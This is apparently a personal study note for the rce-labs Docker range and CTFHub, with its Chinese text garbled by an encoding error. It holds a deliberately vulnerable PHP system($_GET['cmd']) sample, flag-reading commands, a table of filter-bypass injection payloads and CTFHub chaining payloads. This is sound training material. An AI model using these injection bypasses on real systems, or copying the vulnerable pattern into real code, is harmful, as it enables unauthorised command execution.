## rce-labs

è¿™ä¸ªé¶åœºåœ¨dockerä¸Šï¼Œå…ˆå­¦å­¦dockerå‘½ä»¤

### é•œåƒæ“ä½œ

| å‘½ä»¤                                  | ä½œç”¨             | ç¤ºä¾‹                                                      |
| ------------------------------------- | ---------------- | --------------------------------------------------------- |
| `docker images`                       | æŸ¥çœ‹æœ¬åœ°æ‰€æœ‰é•œåƒ | `docker images`ï¼ˆåˆ—å‡ºé•œåƒåã€ç‰ˆæœ¬ã€å¤§å°ï¼‰                 |
| `docker pull <é•œåƒå:ç‰ˆæœ¬>`           | ä»ä»“åº“ä¸‹è½½é•œåƒ   | `docker pull rce-labs:latest`ï¼ˆä¸‹è½½ rce-labs æœ€æ–°ç‰ˆé•œåƒï¼‰ |
| `docker rmi <é•œåƒå/ID>`              | åˆ é™¤æœ¬åœ°é•œåƒ     | `docker rmi rce-labs:latest`ï¼ˆéœ€å…ˆåˆ é™¤åŸºäºè¯¥é•œåƒçš„å®¹å™¨ï¼‰  |
| `docker tag SOURCE_IMAG TARGET_IMAGE` | åˆ›å»ºé•œåƒåˆ«å     |                                                           |

æ ¸å¿ƒå‘½ä»¤

| å‘½ä»¤                                    | ä½œç”¨                           | ç¤ºä¾‹ï¼ˆç»“åˆä½ çš„åœºæ™¯ï¼‰                                         |
| --------------------------------------- | ------------------------------ | ------------------------------------------------------------ |
| `docker ps`                             | æŸ¥çœ‹**æ­£åœ¨è¿è¡Œ**çš„å®¹å™¨         | `docker ps`ï¼ˆçœ‹æ‰€æœ‰è¿è¡Œä¸­çš„å®¹å™¨ï¼‰`docker ps -a`ï¼ˆçœ‹æ‰€æœ‰å®¹å™¨ï¼ŒåŒ…æ‹¬å·²é€€å‡ºçš„ï¼Œå°±æ˜¯ä½ ä¹‹å‰ç”¨çš„ï¼‰ |
| `docker start <å®¹å™¨å/ID>`              | å¯åŠ¨å·²åœæ­¢çš„å®¹å™¨               | `docker start rce-lab-server`ï¼ˆå¯åŠ¨ä½ é€€å‡ºçš„ rce å®¹å™¨ï¼‰       |
| `docker stop <å®¹å™¨å/ID>`               | åœæ­¢è¿è¡Œä¸­çš„å®¹å™¨               | `docker stop compassionate_elgamal`ï¼ˆåœæ­¢é‚£ä¸ªè¿è¡Œä¸­çš„ rce å®¹å™¨ï¼‰ |
| `docker restart <å®¹å™¨å/ID>`            | é‡å¯å®¹å™¨                       | `docker restart rce-lab-server`                              |
| `docker run <å‚æ•°> <é•œåƒå>`            | åˆ›å»ºå¹¶å¯åŠ¨æ–°å®¹å™¨ï¼ˆæ ¸å¿ƒï¼‰       | `docker run -d --name rce-lab-server -p 9000:9000 rce-labs:latest`ğŸ‘‰ å…³é”®å‚æ•°è§£é‡Šï¼š- `-d`ï¼šåå°è¿è¡Œï¼ˆä¸å ç”¨ç»ˆç«¯ï¼‰- `--name`ï¼šç»™å®¹å™¨èµ·è‡ªå®šä¹‰åå­—ï¼ˆæ–¹ä¾¿è¯†åˆ«ï¼‰- `-p ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£`ï¼šç«¯å£æ˜ å°„ï¼ˆæ¯”å¦‚æŠŠä¸»æœº 9000 ç«¯å£æ˜ å°„åˆ°å®¹å™¨ 9000ï¼‰ |
| `docker rm <å®¹å™¨å/ID>`                 | åˆ é™¤å·²åœæ­¢çš„å®¹å™¨               | `docker rm rce-lab-server`ï¼ˆåˆ é™¤æ—§å®¹å™¨ï¼Œéœ€å…ˆ stopï¼‰`docker rm -f rce-lab-server`ï¼ˆå¼ºåˆ¶åˆ é™¤ï¼Œå³ä½¿å®¹å™¨è¿˜åœ¨è¿è¡Œï¼‰ |
| `docker exec <å‚æ•°> <å®¹å™¨å/ID> <å‘½ä»¤>` | è¿›å…¥å®¹å™¨å†…éƒ¨æ‰§è¡Œå‘½ä»¤ï¼ˆè°ƒè¯•ç”¨ï¼‰ | `docker exec -it rce-lab-server /bin/bash`ï¼ˆè¿›å…¥ rce å®¹å™¨çš„å‘½ä»¤è¡Œï¼‰ğŸ‘‰ `-it`ï¼šäº¤äº’å¼è¿›å…¥ï¼Œèƒ½ç›´æ¥æ“ä½œå®¹å™¨å†…æ–‡ä»¶ / å‘½ä»¤ |
| `docker logs <å®¹å™¨å/ID>`               | æŸ¥çœ‹å®¹å™¨æ—¥å¿—ï¼ˆæ’é”™ç¥å™¨ï¼‰       | `docker logs rce-lab-server`ï¼ˆçœ‹å®¹å™¨å¯åŠ¨å¤±è´¥çš„åŸå› ï¼‰`docker logs -f rce-lab-server`ï¼ˆå®æ—¶è·Ÿè¸ªæ—¥å¿—ï¼‰ |

#### Docker Compose

- [docker compose run - å¯åŠ¨ä¸€ä¸ªæ–°å®¹å™¨å¹¶è¿è¡Œä¸€ä¸ªç‰¹å®šçš„åº”ç”¨ç¨‹åºã€‚](https://www.runoob.com/docker/docker-compose-run-command.html)
- [docker compose rm - å¯åŠ¨ä¸€ä¸ªæ–°å®¹å™¨å¹¶åˆ é™¤ä¸€ä¸ªç‰¹å®šçš„åº”ç”¨ç¨‹åºã€‚](https://www.runoob.com/docker/docker-compose-rm-command.html)
- [docker compose ps - ä» docker compose æ£€æŸ¥ docker å®¹å™¨çŠ¶æ€ã€‚](https://www.runoob.com/docker/docker-compose-ps-command.html)
- [docker compose build - æ„å»º docker compose æ–‡ä»¶ã€‚](https://www.runoob.com/docker/docker-compose-bulid-command.html)
- [docker compose up - è¿è¡Œ docker compose æ–‡ä»¶ã€‚](https://www.runoob.com/docker/docker-compose-up-command.html)
- [docker compose ls - åˆ—å‡º docker compose æœåŠ¡ã€‚](https://www.runoob.com/docker/docker-compose-ls-command.html)
- [docker compose start - å¯åŠ¨ docker compose æ–‡ä»¶åˆ›å»ºçš„å®¹å™¨ã€‚](https://www.runoob.com/docker/docker-compose-start-command.html)
- [docker compose restart - é‡å¯ docker compose æ–‡ä»¶åˆ›å»ºçš„å®¹å™¨ã€‚](https://www.runoob.com/docker/docker-compose-restart-command.html)



å†æ¥äº†è§£ä¸€ä¸‹php

```php
<!-- åŸºç¡€æ‰§è¡Œç»“æ„ -->
<?php
  echo "Hello RCE"; // è¾“å‡ºå†…å®¹åˆ°é¡µé¢
  $cmd = "whoami";  // å®šä¹‰å˜é‡å­˜å‚¨å‘½ä»¤
  system($cmd);     // æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å¹¶è¾“å‡ºç»“æœ
  $input = $_GET['cmd']; // è·å–URLä¸­?cmd=xxxçš„è¾“å…¥
  system($input);        // ç›´æ¥æ‰§è¡Œç”¨æˆ·è¾“å…¥çš„å†…å®¹ â†’ æ¼æ´ï¼
?>
```

| å‡½æ•°ç±»å‹     | å‡½æ•°å         | ä½œç”¨                               | ç¤ºä¾‹ï¼ˆrce-labs å¸¸è§ï¼‰                    |
| ------------ | -------------- | ---------------------------------- | ---------------------------------------- |
| ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ | `system()`     | æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œç›´æ¥è¾“å‡ºç»“æœ         | `system("ls /");` â†’ åˆ—å‡ºæ ¹ç›®å½•æ–‡ä»¶       |
|              | `exec()`       | æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œéœ€ç”¨ `echo` è¾“å‡ºç»“æœ | `echo exec("whoami");` â†’ è¾“å‡ºå½“å‰ç”¨æˆ·    |
|              | `shell_exec()` | æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè¿”å›ç»“æœå­—ç¬¦ä¸²       | `echo shell_exec("id");` â†’ è¾“å‡ºç”¨æˆ· ID   |
|              | `` (åå¼•å·)    | ç­‰ä»·äº `shell_exec()`ï¼Œæœ€éšè”½      | `echo `uname -a`;` â†’ è¾“å‡ºç³»ç»Ÿä¿¡æ¯        |
| PHP ä»£ç æ‰§è¡Œ | `eval()`       | æŠŠå­—ç¬¦ä¸²å½“ä½œ PHP ä»£ç æ‰§è¡Œ          | `eval("echo 'RCE';");` â†’ æ‰§è¡Œ echo è¯­å¥  |
|              | `assert()`     | ç±»ä¼¼ evalï¼Œä½ç‰ˆæœ¬ PHP å¯æ‰§è¡Œä»£ç    | `assert("system('ls')");` â†’ æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ |

1. payload `?cmd=cat /flag`
2. `?cmd=tac /flag` å€’åºè¾“å‡º
3. `?cmd=head /flag`
4. `?cmd=tail /flag`
5. `?cmd=more /flag`
6. less
7. nl
8. sort
9. 1
10. 1
11. 1
12. od -t c /flag  odæŠŠæ–‡ä»¶å†…å®¹è½¬ä¸º8è¿›åˆ¶ï¼Œ-t c æŒ‡å®šè¾“å‡ºæ ¼å¼æ˜¯asciiå­—ç¬¦
13. xxd /flag è¾“å‡º16è¿›åˆ¶
14. hexdump /flag è¾“å‡º2è¿›åˆ¶
15. base32è§£ç 

### RCE-Labs ç»•è¿‡æŠ€å·§æ±‡æ€»è¡¨

![image-20251227005655560](C:\Users\GWG\AppData\Roaming\Typora\typora-user-images\image-20251227005655560.png)

| å…³å¡        | è€ƒå¯Ÿç‚¹ / è¿‡æ»¤é™åˆ¶  | æ ¸å¿ƒç»•è¿‡æŠ€å·§ (How to do)                                     | æœ€ç»ˆ Payload (æ‰§è¡Œå‘½ä»¤)                                      |
| :---------- | :----------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |
| **Less-42** | è¿‡æ»¤ç©ºæ ¼ (`\x20`)  | **ç¯å¢ƒå˜é‡ç»•è¿‡**ï¼šä½¿ç”¨ `${IFS}` æ›¿ä»£ç©ºæ ¼ä½œä¸ºåˆ†éš”ç¬¦ã€‚         | `cat${IFS}/flag`                                             |
| **Less-43** | è¿‡æ»¤ç©ºæ ¼ + `$IFS`  | **èŠ±æ‹¬å·æ‰©å±•**ï¼šåˆ©ç”¨ Bash çš„ `{,}` è¯­æ³•è‡ªåŠ¨è§£æç©ºæ ¼ã€‚        | `{cat,/flag}`                                                |
| **Less-44** | è¿‡æ»¤å…³é”®å­— `cat`   | **å•å¼•å·æ‹†åˆ†**ï¼šåˆ©ç”¨ `''` æˆªæ–­å…³é”®å­— + è¾“å…¥é‡å®šå‘ `<` æ›¿ä»£ç©ºæ ¼ã€‚ | `c'a't</flag`                                                |
| **Less-45** | è¿‡æ»¤å…³é”®å­— `cat`   | **åŒå¼•å·æ‹†åˆ†**ï¼šåˆ©ç”¨ `""` æˆªæ–­å…³é”®å­— + è¾“å…¥é‡å®šå‘ `<` æ›¿ä»£ç©ºæ ¼ã€‚ | `c"a"t</flag`                                                |
| **Less-46** | è¿‡æ»¤ `cat` + `?`   | **é€šé…ç¬¦ ?**ï¼šä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Œç”¨ `?` ä»£æ›¿å­—ç¬¦åŒ¹é… `/bin/cat`ã€‚ | `/bin/c?t</flag`                                             |
| **Less-47** | è¿‡æ»¤ `cat` + `*`   | **é€šé…ç¬¦ \***ï¼šä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Œç”¨ `*` æ¨¡ç³ŠåŒ¹é… `/bin/cat`ã€‚    | `/bin/ca*</flag`                                             |
| **Less-48** | è¿‡æ»¤åæ–œæ  `\`     | **è½¬ä¹‰ç¬¦æ‹†åˆ†**ï¼šåæ–œæ  `\` åœ¨ Shell ä¸­è¢«å¿½ç•¥ï¼Œç”¨äºåˆ†å‰²å…³é”®å­—ã€‚ | `c\at</flag`                                                 |
| **Less-49** | ä¸¥æ ¼è¿‡æ»¤ `cat`     | **ç©ºå˜é‡æ‹†åˆ†**ï¼š`$@` ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œæ’å…¥å…³é”®å­—ä¸­ä¸å½±å“æ‰§è¡Œä½†èƒ½ç»•è¿‡æ­£åˆ™ã€‚ | `c$@at</flag`                                                |
| **Less-50** | è¿‡æ»¤ç‚¹å· `.`       | **å‘½ä»¤æ›¿æ¢**ï¼šæ”¾å¼ƒ `cat`ï¼Œæ”¹ç”¨ä¸å«ç‚¹å·çš„ `paste` å‘½ä»¤è¯»å–æ–‡ä»¶ã€‚ | `paste</flag`                                                |
| **Less-51** | æ— å›æ˜¾ (Blind RCE) | **æ•°æ®å¤–å¸¦**ï¼šåˆ©ç”¨ `>` å°†ç»“æœå†™å…¥ Web ç›®å½•ä¸‹çš„æ–°æ–‡ä»¶ï¼Œå†è®¿é—®è¯¥æ–‡ä»¶ã€‚ | `cat /flag >/var/www/html/flag.txt`<br>*(æ‰§è¡Œåè®¿é—® `/flag.txt` æŸ¥çœ‹ç»“æœ)* |



## åŸç†

å‘½ä»¤è¿æ¥ç¬¦ï¼š

### ğŸ–¥ï¸ RCE å‘½ä»¤è¿æ¥ç¬¦æ€»ç»“è¡¨

|   ç¬¦å·   |   ç±»å‹   |  é€‚ç”¨ç³»ç»Ÿ   | é€»è¾‘ / ä½œç”¨ (Command A `ç¬¦å·` Command B)                     | å¸¸ç”¨åœºæ™¯ / è®°å¿†å£è¯€                                          |
| :------: | :------: | :---------: | :----------------------------------------------------------- | :----------------------------------------------------------- |
|    \|    |   å…±æœ‰   |             | **ç®¡é“ç¬¦**<br/>å°† A çš„**è¾“å‡º**ä½œä¸º B çš„**è¾“å…¥**ã€‚<br/>(B ä¼šè¢«æ‰§è¡Œï¼ŒA çš„ç»“æœä½ çœ‹ä¸åˆ°ï¼Œåªçœ‹åˆ° B å¤„ç†åçš„ç»“æœ) |                                                              |
|   \|\|   |   å…±æœ‰   |             | Aæ‰§è¡Œå¤±è´¥ï¼ŒBæ‰ä¼šæ‰§è¡Œ                                         |                                                              |
| **`&&`** | **å…±æœ‰** | Win / Linux | **é€»è¾‘ä¸**<br>åªæœ‰ A **æ‰§è¡ŒæˆåŠŸ** æ—¶ï¼ŒB æ‰ä¼šè¢«æ‰§è¡Œã€‚<br>(å¦‚æœ A å¤±è´¥ï¼ŒB å°±ä¸è·‘äº†) | **å‰è€…æ´»ï¼Œåè€…ç”Ÿ**<br>`ping 127.0.0.1 && whoami`<br>å‰é¢é€šäº†ï¼Œæ‰æ‰§è¡Œåé¢ |
| **`&`**  | **ç‰¹æœ‰** | **Windows** | **åå°/é¡ºåºæ‰§è¡Œ**<br>å…ˆæ‰§è¡Œ Aï¼Œå†æ‰§è¡Œ Bã€‚<br>**ä¸ç®¡ A æˆåŠŸè¿˜æ˜¯å¤±è´¥**ï¼ŒB éƒ½ä¼šæ‰§è¡Œã€‚ | **æ— è„‘æ‰§è¡Œ**<br>`ping 127.0.0.1 & whoami`<br>ä¸¤ä¸ªéƒ½è·‘ï¼Œä¸ç®¡æ­»æ´» |
| **`;`**  | **ç‰¹æœ‰** |  **Linux**  | **é¡ºåºæ‰§è¡Œ**<br>å…ˆæ‰§è¡Œ Aï¼Œå†æ‰§è¡Œ Bã€‚<br>**ä¸ç®¡ A æˆåŠŸè¿˜æ˜¯å¤±è´¥**ï¼ŒB éƒ½ä¼šæ‰§è¡Œã€‚ | **æ— è„‘æ‰§è¡Œ**<br>`ping 127.0.0.1 ; whoami`<br>ä¸¤ä¸ªéƒ½è·‘ï¼Œä¸ç®¡æ­»æ´» |

## ctfhub

1. å‘½ä»¤æ³¨å…¥ï¼šå’©æœ‰è¿‡æ»¤ï¼Œç›´æ¥æ„é€ payload:`?ip=127.1 || ls`  `ip=127 || cat ----.php`,éƒ½æ˜¯è®©shell1æ‰§è¡Œå¤±è´¥ç„¶åæ‰§è¡Œshell2
2. è¿‡æ»¤cat è¿™ä¸ªä¸è¡Œäº†è¿˜æœ‰å¥½å¤šåˆ«çš„ï¼Œtac more less head tail nl tailf ,è¿˜æœ‰c'a't c''a''t
3. è¿‡æ»¤ç©ºæ ¼ï¼Œå°±ç”¨{IFS}ä»£æ›¿
4. è¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦ï¼Œè¿™ä¸ªè¿‡æ»¤äº†ä¹‹åä¸èƒ½ç›´æ¥`cat /flag`äº†,éœ€è¦å…ˆcdè¿›å…¥æ–‡ä»¶å¤¹
5. è¿‡æ»¤è¿ç®—ç¬¦ï¼Œæ²¡è¿‡æ»¤ï¼›å’Œcat
6. ç»¼åˆï¼Œflagè¢«è¿‡æ»¤å¯ä»¥ä½¿ç”¨æ­£åˆ™f***,å‘½ä»¤åˆ†éš”ç¬¦é™¤äº†ï¼›è¿˜æœ‰%0a(å°±æ˜¯æ¢è¡Œç¬¦)ï¼Œä½†æ˜¯éœ€è¦åœ¨urlä¸­è¾“å…¥ï¼Œå¦‚æœåœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥è¿˜ä¼šè¢«ç¼–ç 
